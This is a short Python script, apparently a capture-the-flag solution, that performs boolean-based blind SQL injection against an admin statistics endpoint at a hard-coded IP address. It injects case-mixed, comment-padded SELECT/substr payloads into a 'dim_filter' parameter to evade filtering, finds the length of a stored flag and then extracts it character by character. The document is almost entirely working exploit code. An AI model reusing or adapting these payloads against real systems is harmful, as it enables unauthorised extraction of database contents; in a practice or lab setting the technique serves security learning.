import requests, re, sys

SITE = "http://39.105.213.28:8000/admin/stat/activity/"
HEAD = {
    "User-Agent": "Campus-Stat/1.0",
    "Referer": "https://campus-stat.example.com/",
    "X-Campus-Token": "campus-ctf-2024-abc123",
}
# 常用字符放前面，减少请求量
POOL = "{}_ISCATN0123456789!@#$%^&*-+=ABCDEFGHJKLMOPQRUVWXYZabcdefghijklmnopqrstuvwxyz"

def ask(cond):
    try:
        r = requests.get(SITE, headers=HEAD, params={"dim_filter": cond}, timeout=10)
        m = re.search(r'✅ (\d+)', r.text)
        return m and m.group(1) == "10"
    except:
        return False

# 线性确定长度
n = None
for i in range(1, 80):
    if ask(f"length((SeLeCt/**/value/**/FrOm/**/flag))={i}"):
        n = i
        print(f"[+] len = {i}")
        break

# 逐位等值匹配
flag = ""
for p in range(1, n + 1):
    for c in POOL:
        if ask(f"substr((SeLeCt/**/value/**/FrOm/**/flag),{p},1)='{c}'"):
            flag += c
            print(f"  [{p:02d}] {flag}")
            break
    if flag.endswith("}"):
        break

print(f"\nFLAG: {flag}")
